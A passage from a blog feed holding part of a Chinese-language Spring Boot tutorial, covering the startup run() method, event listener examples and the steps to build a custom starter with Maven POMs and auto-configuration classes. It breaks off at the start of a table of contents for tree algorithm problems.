src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306145855.png" alt></p><h2><span id="2-运行run方法">2、运行run方法</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">   StopWatch stopWatch = <span class="keyword">new</span> StopWatch();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   ConfigurableApplicationContext context = <span class="keyword">null</span>;</span><br><span class="line">   FailureAnalyzers analyzers = <span class="keyword">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//获取SpringApplicationRunListeners；从类路径下META-INF/spring.factories</span></span><br><span class="line">   SpringApplicationRunListeners listeners = getRunListeners(args);</span><br><span class="line">    <span class="comment">//回调所有的获取SpringApplicationRunListener.starting()方法</span></span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">//封装命令行参数</span></span><br><span class="line">      ApplicationArguments applicationArguments = <span class="keyword">new</span> DefaultApplicationArguments(</span><br><span class="line">            args);</span><br><span class="line">      <span class="comment">//准备环境</span></span><br><span class="line">      ConfigurableEnvironment environment = prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">       <span class="comment">//创建环境完成后回调SpringApplicationRunListener.environmentPrepared()；表示环境准备完成</span></span><br><span class="line">       </span><br><span class="line">      Banner printedBanner = printBanner(environment);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//创建ApplicationContext；决定创建web的ioc还是普通的ioc</span></span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">       </span><br><span class="line">      analyzers = <span class="keyword">new</span> FailureAnalyzers(context);</span><br><span class="line">       <span class="comment">//准备上下文环境;将environment保存到ioc中；而且applyInitializers()；</span></span><br><span class="line">       <span class="comment">//applyInitializers()：回调之前保存的所有的ApplicationContextInitializer的initialize方法</span></span><br><span class="line">       <span class="comment">//回调所有的SpringApplicationRunListener的contextPrepared()；</span></span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       <span class="comment">//prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）；</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment">//s刷新容器；ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）；Spring注解版</span></span><br><span class="line">       <span class="comment">//扫描，创建，加载所有组件的地方；（配置类，组件，自动配置）</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">       <span class="comment">//从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调</span></span><br><span class="line">       <span class="comment">//ApplicationRunner先回调，CommandLineRunner再回调</span></span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">       <span class="comment">//所有的SpringApplicationRunListener回调finished方法</span></span><br><span class="line">      listeners.finished(context, <span class="keyword">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> StartupInfoLogger(<span class="keyword">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">       <span class="comment">//整个SpringBoot应用启动完成以后返回启动的ioc容器；</span></span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="3-事件监听机制">3、事件监听机制</span></h2><p>配置在META-INF/spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplicationContextInitializer</span> <span class="keyword">implements</span> <span class="title">ApplicationContextInitializer</span>&lt;<span class="title">ConfigurableApplicationContext</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(ConfigurableApplicationContext applicationContext)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ApplicationContextInitializer...initialize..."</span>+applicationContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SpringApplicationRunListener</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloSpringApplicationRunListener</span> <span class="keyword">implements</span> <span class="title">SpringApplicationRunListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//必须有的构造器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloSpringApplicationRunListener</span><span class="params">(SpringApplication application, String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">starting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...starting..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">environmentPrepared</span><span class="params">(ConfigurableEnvironment environment)</span> </span>&#123;</span><br><span class="line">        Object o = environment.getSystemProperties().get(<span class="string">"os.name"</span>);</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...environmentPrepared.."</span>+o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextPrepared</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...contextPrepared..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextLoaded</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...contextLoaded..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">finished</span><span class="params">(ConfigurableApplicationContext context, Throwable exception)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...finished..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置（META-INF/spring.factories）</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">org.springframework.context.ApplicationContextInitializer</span>=<span class="string">\</span></span><br><span class="line"><span class="attr">com.atguigu.springboot.listener.HelloApplicationContextInitializer</span></span><br><span class="line"></span><br><span class="line"><span class="meta">org.springframework.boot.SpringApplicationRunListener</span>=<span class="string">\</span></span><br><span class="line"><span class="attr">com.atguigu.springboot.listener.HelloSpringApplicationRunListener</span></span><br></pre></td></tr></table></figure><p>只需要放在ioc容器中</p><p><strong>ApplicationRunner</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplicationRunner</span> <span class="keyword">implements</span> <span class="title">ApplicationRunner</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ApplicationRunner...run...."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CommandLineRunner</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloCommandLineRunner</span> <span class="keyword">implements</span> <span class="title">CommandLineRunner</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String... args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"CommandLineRunner...run..."</span>+ Arrays.asList(args));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="八-自定义starter">八、自定义starter</span></h1><p>starter：</p><p>​    1、这个场景需要使用到的依赖是什么？</p><p>​    2、如何编写自动配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>  <span class="comment">//指定这个类是一个配置类</span></span><br><span class="line"><span class="meta">@ConditionalOnXXX</span>  <span class="comment">//在指定条件成立的情况下自动配置类生效</span></span><br><span class="line"><span class="meta">@AutoConfigureAfter</span>  <span class="comment">//指定自动配置类的顺序</span></span><br><span class="line"><span class="meta">@Bean</span>  <span class="comment">//给容器中添加组件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationPropertie</span>结合相关xxxProperties类来绑定相关的配置</span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span> <span class="comment">//让xxxProperties生效加入到容器中</span></span><br><span class="line"></span><br><span class="line">自动配置类要能加载</span><br><span class="line">将需要启动就加载的自动配置类，配置在META-INF/spring.factories</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br></pre></td></tr></table></figure><p>​    3、模式：</p><p>启动器只用来做依赖导入；</p><p>专门来写一个自动配置模块；</p><p>启动器依赖自动配置；别人只需要引入启动器（starter）</p><p>mybatis-spring-boot-starter；自定义启动器名-spring-boot-starter</p><p>步骤：</p><p>1）、启动器模块</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--启动器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--引入自动配置模块--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2）、自动配置模块</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!--引入spring-boot-starter；所有starter的基本配置--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"atguigu.hello"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloProperties</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String prefix;</span><br><span class="line">    <span class="keyword">private</span> String suffix;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPrefix</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> prefix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrefix</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.prefix = prefix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSuffix</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> suffix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSuffix</span><span class="params">(String suffix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.suffix = suffix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloProperties <span class="title">getHelloProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helloProperties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHelloProperties</span><span class="params">(HelloProperties helloProperties)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.helloProperties = helloProperties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHellAtguigu</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helloProperties.getPrefix()+<span class="string">"-"</span> +name + helloProperties.getSuffix();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span> <span class="comment">//web应用才生效</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span>(HelloProperties<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">HelloServiceAutoConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloService <span class="title">helloService</span><span class="params">()</span></span>&#123;</span><br><span class="line">        HelloService service = <span class="keyword">new</span> HelloService();</span><br><span class="line">        service.setHelloProperties(helloProperties);</span><br><span class="line">        <span class="keyword">return</span> service;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="更多springboot整合示例">更多SpringBoot整合示例</span></h1><p><a href="https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples</a></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树</title>
      <link href="/2020/03/30/Tree/"/>
      <url>/2020/03/30/Tree/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘录了一些经典的树的题，一共题。</p><a id="more"></a><!-- toc --><ul><li><a href="#树的重建">树的重建</a><ul><li><a href="#105-construct-binary-tree-from-preorder-and-inorder-traversal-">105. Construct Binary Tree from Preorder and Inorder Traversal -</a></li><li><a href="#106-construct-binary-tree-from-inorder-and-postorder-traversal-">106. Construct Binary Tree from Inorder and Postorder Traversal -</a></li><li><a href="#297-serialize-and-deserialize-binary-tree-">297. Serialize and Deserialize Binary Tree -</a></li><li><a href="#109-convert-sorted-list-to-binary-search-tree-">109. Convert Sorted List to Binary Search Tree -</a></li><li><a href="#99-recover-binary-search-tree">99. Recover Binary Search Tree ×</a></li></ul></li><li><a href="#树的遍历回溯">树的遍历（回溯）</a><ul><li><a href="#94-binary-tree-inorder-traversal-iteratively">94. Binary Tree Inorder Traversal (Iteratively) ×</a></li><li><a href="#144-binary-tree-preorder-traversal-iteratively">144. Binary Tree Preorder Traversal (Iteratively) ×</a></li><li><a href="#145-binary-tree-postorder-traversal-iteratively">145. Binary Tree Postorder Traversal (Iteratively) ×</a></li><li><a href="#103-binary-tree-zigzag-level-order-traversal">103. Binary Tree Zigzag Level Order Traversal √</a></li><li><a href="#102-binary-tree-level-order-traversal">102. Binary Tree Level Order Traversal √</a></li><li><a href="#107-binary-tree-level-order-traversal-ii">107. Binary Tree Level Order Traversal II 